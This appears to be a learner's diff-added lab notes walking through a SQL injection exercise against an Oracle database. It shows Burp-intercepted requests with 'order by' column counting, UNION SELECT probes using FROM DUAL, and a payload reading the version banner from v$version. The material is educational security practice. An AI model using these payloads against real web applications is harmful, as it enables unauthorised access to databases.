@@ -1,0 +1,40 @@
+SQL injection attack, querying the database type and version on Oracle
+
+1/we need to determine the number of column
+assumptions is we have two column because we have the title of the item and the
+details of the item 
+
+to find all the columun we use
+'order by 1--
+
+we are using burp to intercept the request to change them we use proxy
+GET /filter?category=Gifts' order by 1-- CTRL U to encode it we get -->
+GET /filter?category=Gifts'+order+by+1--
+we get a 200 reponse code confim it that we have at least 1 columns 
+GET /filter?category=Gifts'+order+by+2-- 
+same 200 so we got two columns
+GET /filter?category=Gifts'+order+by+3-- 
+500 Internal server error so we dont have 3 column
+
+2/ we need to find the data types of the column
+we use a ' UNION SELECT NULL, NULL--
+we gonna test each one 
+' UNION SELECT 'a', 'a'--
+we either get an type error or no 
+we got an 500 Internal servor error because we didnt say it was an ORACLE database 
+(An Oracle Database is a highly powerful relational database management system)
+so in oracle we need to write it as
+' UNION SELECT 'a', 'a' from DUAL--
+
+
+3/output the version of the database
+look at the cheatsheet we can see 
+SELECT banner FROM v$version
+now we type the full command 
+' UNION SELECT banner, NULL from v$version--
+
+we found 
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+banner refers to a built-in column or metadata field that contains the full,
+detailed version and build information of the database software.
